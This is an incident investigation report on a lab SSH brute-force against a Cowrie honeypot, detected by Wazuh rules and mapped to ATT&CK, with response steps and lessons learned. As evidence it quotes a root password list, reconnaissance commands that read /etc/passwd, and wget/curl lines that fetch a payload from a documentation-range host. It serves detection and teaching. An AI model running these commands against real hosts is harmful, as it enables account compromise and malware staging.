# Incident Investigation Report, INC-2026-0819-001

**SSH brute-force and post-compromise activity against `web-prod-01`**

| | |
|---|---|
| **Incident ID** | INC-2026-0819-001 |
| **Report date** | 2026-08-19 |
| **Analyst** | Abhishek Kumar Sahu |
| **Classification** | High severity, confirmed intrusion (controlled lab exercise) |
| **Detection window** | 2026-08-19 22:19:56 to 22:20:23 UTC |
| **Framework** | NIST SP 800-61 incident-response lifecycle |

> This report is structured on the NIST SP 800-61 lifecycle (detection and
> analysis, containment/eradication/recovery, post-incident activity). It is the
> companion deliverable to the [`honeypot-siem`](https://github.com/themodernhacker/honeypot-siem)
> detection-engineering project: that repo builds and tests the rules, this one
> is the investigation an analyst files after those rules fire. The lab framing
> is stated honestly in the impact section and is not blurred into the analysis.

---

## 1. Executive summary

At 22:19:56 UTC on 2026-08-19 a single source, 172.19.0.1, launched an SSH
password brute-force against the `root` account on `web-prod-01` and succeeded on
the 11th attempt with the credential `root/hunter2`. Within two seconds of gaining
access the actor opened an interactive shell and ran six host-discovery commands,
then made two attempts to download a remote second-stage payload before
disconnecting. Wazuh detected every stage and raised two level 12 alerts, the
highest severity the deployed ruleset produces: one for the login that followed
the brute-force burst (rule 100105) and one for the post-compromise reconnaissance
(rule 100151). No payload was retrieved and no data was exfiltrated; the whole
sequence lasted 27 seconds.

---

## 2. Incident classification

| Attribute | Value |
|-----------|-------|
| **Severity** | High |
| **Priority** | P2 |
| **Status** | Closed, resolved |
| **Category** | Unauthorised access, account compromise via credential brute force |
| **Detected by** | Rule 100105 (level 12), then rule 100151 (level 12) |
| **Affected asset** | `web-prod-01`, SSH honeypot, 172.19.0.2:2222 |
| **Attacker** | 172.19.0.1 (single source) |

**Severity justification.** The severity rating is anchored to the deployed
ruleset's own levels rather than asserted. In this lab the custom Cowrie rules
top out at level 12, and this incident fired two distinct level 12 detections:
rule 100105 (a successful login off the back of a brute-force burst, that is,
confirmed account takeover) and rule 100151 (host enumeration by that same source
once inside). A single event reaching the ceiling of the detection scale supports
High; two independent level 12 detections, one for access and one for
post-access activity, remove any ambiguity. The chain also spans four ATT&CK
tactics (Credential Access, Initial Access, Discovery, Command and Control), which
is consistent with hands-on-keyboard intrusion rather than opportunistic noise.

---

## 3. Detection and analysis

### 3.1 Initial detection

The first high-severity signal was rule **100104** (brute-force burst, level 10)
at 22:20:07, when the eighth failed `root` login inside the 120-second window
crossed the threshold. Nine seconds later the actor guessed the working password
and rule **100105** (level 12) fired, promoting the event from "someone is
guessing passwords" to "someone has an account". 100105 is the alert that would
page the on-call analyst first, and it is where this investigation begins.

### 3.2 Timeline

The full correlated timeline, every event tied to the rule that fired on it, is in
[`evidence/timeline.md`](evidence/timeline.md). Condensed:

| Time (UTC) | Activity | Rule | Level |
|-----------|----------|:----:|:-----:|
| 22:19:56 – 22:20:10 | 10 failed `root` logins from 172.19.0.1 | 100102 / 100104 | 5 / 10 |
| 22:20:11 – 22:20:12 | Successful `root/hunter2` login, rapid-connection burst | 100105 / 100110 | 12 / 7 |
| 22:20:13 – 22:20:19 | 6 host-discovery commands in the shell | 100107 / 100151 | 8 / 12 |
| 22:20:20 – 22:20:21 | 2 remote payload download attempts | 100108 | 10 |
| 22:20:22 – 22:20:23 | `exit`, session closed | 100106 | 5 |

### 3.3 Technical analysis by phase

**Phase 1, credential access (T1110).** From 22:19:56 the source opened ten
short-lived SSH sessions in about 14 seconds, one per password, against `root`:
`admin, password, 123456, 12345, root, toor, qwerty, letmein, changeme, 000000`.
Each failure logged a `cowrie.login.failed` event and matched rule 100102. On the
eighth failure the frequency rule 100104 fired at level 10. The tight, uniform
timing (a new connection roughly every 1.5 seconds) is machine-driven, not a human
typing passwords.

**Phase 2, automated connection velocity (T1046).** The volume of back-to-back
connections also tripped rule 100110 (12 or more connections in 60 seconds) at
level 7. This is the honeypot-side reflection of automated tooling rather than a
distinct port-scan phase: Cowrie only exposes 2222, so the "network service
discovery" signal here is connection velocity, not a multi-port sweep. This is
called out honestly rather than inflated into a scan that the sensor could not
actually have seen (see the T1046 note in the
[MITRE mapping](https://github.com/themodernhacker/honeypot-siem/blob/main/docs/MITRE-MAPPING.md)).

**Phase 3, initial access (T1078 + T1110).** At 22:20:11 the 11th password,
`hunter2`, succeeded. Because the success came from a source already flagged by
100104, rule 100105 fired at level 12: this is the pivot from attempted to actual
compromise. The attack tooling validated the credential in one session and then
reconnected at 22:20:12 to open the interactive shell (`84b2d6cd4479`) where all
subsequent activity took place.

**Phase 4, post-exploitation discovery (T1082 + T1033).** Starting one second
after landing, the actor ran, in order: `whoami`, `id`, `uname -a`,
`cat /etc/passwd`, `ps aux`, `ifconfig`. This is a textbook orientation sweep:
who am I, what can I do, what OS and kernel is this, who else has an account, what
is running, how is the network configured. Every command matched the recon rule
100107, and because the same source had already tripped the brute-force rule,
each one escalated to rule 100151 at level 12. That escalation is the whole point
of 100151: an `id` on its own is routine, but an `id` seconds after a brute-force
compromise is an attacker working a checklist, and it deserves to page.

**Phase 5, command and control (T1105).** At 22:20:20 and 22:20:21 the actor tried
to pull a second stage:
`wget http://203.0.113.10/x.sh -O /tmp/x.sh` and
`curl http://203.0.113.10/payload -o /tmp/p`. Both matched rule 100108 at level
10. Crucially, no `cowrie.session.file_download` event (which would fire rule
100109) followed either command, so nothing was actually retrieved. The
distinction between "attempted download" and "completed download" is a real triage
signal and is preserved by keeping 100108 and 100109 as separate rules.

### 3.4 Indicators of compromise

Full IOC table: [`iocs.md`](iocs.md). Headline indicators: source 172.19.0.1;
credential `root/hunter2`; payload URLs `http://203.0.113.10/x.sh` and
`http://203.0.113.10/payload`.

---

## 4. Impact assessment

**Actual impact: none.** `web-prod-01` is a Cowrie SSH honeypot. There is no real
operating system, no real `root` account, and no real data behind it; the shell
the attacker interacted with is emulated, and the `/etc/passwd` they read was
synthetic. The payload host, 203.0.113.10, is in TEST-NET-3 (RFC 5737, reserved
for documentation and non-routable), so even if a download had completed it would
have fetched nothing. No production system was touched.

**Hypothetical impact, if this were a real host.** Framing this explicitly as an
assumption: *if* 172.19.0.2 were a genuine internet-facing Linux server of the
type `web-prod-01` impersonates, the outcome by 22:20:23 would be a full
interactive `root` foothold obtained through a weak, guessable password. From
there the realistic exposure is: reading of local credential material and account
data (`/etc/passwd` was already accessed, `/etc/shadow` would be the next target),
staging of a second-stage payload for persistence or coin-mining, use of the host
as a pivot into the internal network, and destruction or exfiltration of whatever
data the box holds. A `root` compromise of an internet-facing host is
business-critical because it is the worst-case starting point for everything that
follows.

---

## 5. Containment, eradication and recovery

Written as one coherent response plan for the hypothetical real-host case, in the
order an analyst would actually execute it:

1. **Contain the source.** Block 172.19.0.1 at the perimeter firewall and drop its
   active sessions. In this lab the equivalent is denying the source at the
   honeypot boundary.
2. **Contain the account.** Treat `root/hunter2` as compromised: disable the
   account's remote access immediately and force-rotate the credential. Because
   password reuse is the norm, check whether the same password protects any other
   host and rotate everywhere it appears.
3. **Eradicate the foothold.** Terminate the attacker's shell (session
   `84b2d6cd4479`), and hunt for anything the download attempts might have staged.
   Here nothing landed (no 100109), but on a real host the `/tmp/x.sh` and
   `/tmp/p` paths and any spawned processes or new cron entries would be checked
   and removed.
4. **Eradicate the entry vector.** The root cause is password authentication on an
   internet-facing service. Disable SSH password auth entirely and move to key
   based auth, disable direct `root` login (`PermitRootLogin no`), and put the
   service behind rate-limiting (fail2ban or an equivalent) so a burst like this
   is throttled before it can complete.
5. **Recover and verify.** Restore the host from a known-good state if any
   persistence is found, confirm the new authentication controls are enforced,
   and monitor 172.19.0.1 and the `root` account closely for follow-on attempts.
6. **Preserve evidence.** Retain the raw `cowrie.json` lines and the Wazuh alerts
   for this incident (attached under `evidence/`) so the investigation is
   reproducible and the timeline is defensible.

---

## 6. Recommendations

Longer-term hardening and detection improvements:

- **Authentication.** Enforce key-based SSH across the estate and remove password
  auth; this single change would have made the entire brute-force phase
  impossible.
- **Exposure.** Keep management SSH off the public internet where feasible, behind
  a bastion or VPN, so opportunistic internet-wide brute force never reaches it.
- **Detection tuning.** The rules that caught this incident are production-viable
  but need environment tuning before wider rollout: baseline and allowlist known
  administrative sources so post-login recon does not page on legitimate activity,
  and keep escalating recon only when it follows a compromise signal. The full
  tuning approach is documented in the companion project's
  [tuning write-up](https://github.com/themodernhacker/honeypot-siem/blob/main/docs/writeup-tuning.md)
  and is not repeated here.
- **Threat intel.** Even on a failed download, the payload URLs and host are
  intelligence: submit `203.0.113.10` and the two URLs to threat feeds and block
  the destination at the proxy so the next attempt fails even if a host is popped.

---

## 7. Lessons learned and retrospective

**What the detection got right.** The pipeline caught the intrusion end to end and,
more importantly, escalated correctly. The two level 12 alerts told the real story
on their own: account takeover (100105), then hands-on enumeration (100151). An
analyst paged on 100105 alone would have had the full picture within one click.

**What it did not, and the known limitations.** These are documented honestly in
the companion project and apply to this incident too:

- **Rule 100105 correlates on source IP only, not username.** In this incident the
  brute force and the successful login are unambiguously the same actor, but on a
  real network behind a NAT the same rule could pair one user's failures with a
  different user's success and read it as a compromise. The mature form keys the
  correlation on IP and username together.
- **The T1046 signal is weak by design.** The "network service discovery" alert
  (100110) here is connection velocity, not a real port scan, because Cowrie only
  exposes one port. It is a supporting signal, not standalone evidence of scanning.
- **The escalation anchors on the brute-force rule, not the compromise rule.**
  Rule 100151 keys on 100104 rather than 100105, because of a Wazuh correlation
  detail (`if_matched_sid` looks back over frequency rules, not over composite
  rules that themselves fired via `if_matched_sid`). The net effect is the same
  for this incident (recon requires a shell, and the shell required the brute
  force), but it is worth stating precisely rather than implying the escalation
  keys on the compromise alert directly. The full detail is in the companion
  project's tuning write-up.

**What I would add.** A username field on the 100105 correlation, and an explicit
allowlist of administrative sources, would be the two highest-value changes before
running this content against real traffic.

---

## 8. Appendix

### A. ATT&CK techniques observed in this incident

| Tactic | Technique | ID | Rule(s) |
|--------|-----------|----|---------|
| Credential Access | Brute Force | T1110 | 100102, 100104 |
| Discovery | Network Service Discovery | T1046 | 100110 |
| Initial Access | Valid Accounts | T1078 | 100103, 100105 |
| Execution | Unix Shell | T1059.004 | 100106 |
| Discovery | System Information Discovery | T1082 | 100107, 100151 |
| Discovery | System Owner/User Discovery | T1033 | 100107, 100151 |
| Command and Control | Ingress Tool Transfer | T1105 | 100108 |

Rule-to-technique detail for the full ruleset:
[honeypot-siem MITRE mapping](https://github.com/themodernhacker/honeypot-siem/blob/main/docs/MITRE-MAPPING.md).

### B. Evidence exhibits

- [`evidence/timeline.md`](evidence/timeline.md), correlated event timeline.
- [`evidence/raw-logs/cowrie-incident-2026-08-19.json`](evidence/raw-logs/cowrie-incident-2026-08-19.json),
  trimmed raw Cowrie events for this incident.
- [`evidence/screenshots/`](evidence/screenshots/), Wazuh alert exhibits for this run.
- [`iocs.md`](iocs.md), indicator reference.
